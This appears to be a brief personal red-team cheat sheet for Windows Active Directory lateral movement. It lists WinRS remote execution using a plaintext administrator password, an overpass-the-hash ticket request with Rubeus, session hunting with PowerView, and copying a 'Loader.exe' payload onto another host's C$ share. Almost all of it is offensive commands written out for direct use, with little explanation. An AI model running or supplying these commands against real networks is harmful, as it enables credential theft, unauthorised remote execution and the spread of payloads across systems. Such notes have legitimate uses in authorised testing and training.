### **WINRS**
```powershell
winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
```
```powershell
winrs -r:<MACCHINA> cmd
```
### **OVERPASS THE HASH**
```powershell
rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

### **Other Sessions Opened**
```powerview
Find-DomainUserLocation
```
![[Pasted image 20231018164427.png]]
Connect Using Win-rs
### **Copy from a machine to another**
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\<R MACHINE>\C$\Users\Public\Loader.exe
```
